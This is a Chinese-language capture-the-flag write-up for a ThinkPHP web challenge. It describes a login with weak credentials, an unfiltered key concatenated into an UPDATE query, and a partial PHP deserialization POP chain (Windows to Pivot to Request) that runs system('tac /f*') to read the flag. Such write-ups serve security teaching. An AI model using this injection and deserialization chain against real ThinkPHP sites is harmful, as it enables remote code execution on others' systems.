# thinkshop

> 分类：Web

## 题目描述

ThinkPHP 代码审计。登录后台后利用商品修改处的 SQL 注入 + serialize 反序列化，用 phpggc 生成 TP 链 getshell。

## 考察知识点

- ThinkPHP 代码审计
- SQL 注入（UPDATE ... unhex 拼接）
- ThinkPHP 反序列化（phpggc）

## 解法

1. 登录口 `index/admin/login`，用户名 `1`、密码 `123456` 登录成功（find 主键查找）。
2. 审计 `update.php` 的 `updatedata`，`$key` 无过滤拼接 SQL；`Goods.php` 的 `saveGoods` 做 `base64_encode(serialize($this->markdownToArray($data['data'])))`。
3. 修改商品信息时传入 `data` 参数，闭合 SQL 注入点，把 data 覆盖为恶意序列化数据（TP 反序列化链）。
4. 用 phpggc 或手写 exp 生成 `think\process\pipes\Windows -> Pivot -> BelongsTo -> ... -> Request(system)` 链：

```php
namespace think\process\pipes {
    class Windows {
        private $files = [];
        public function __construct($function, $parameter) {
            $this->files = [new \think\model\Pivot($function, $parameter)];
        }
    }
}
// ... 完整 POP 链见原博客
$aaa = new Windows('system', 'tac /f*');
echo base64_encode(serialize($aaa));
```

5. 访问商品详情页触发反序列化，执行 `system` 读取 flag。

## 参考答案

（flag 通过 TP 反序列化 RCE 读取）

## 来源

- 作者：山石网科安全技术研究院 | https://cn-sec.com/archives/2316376.html
- https://cn-sec.com/archives/2314955.html
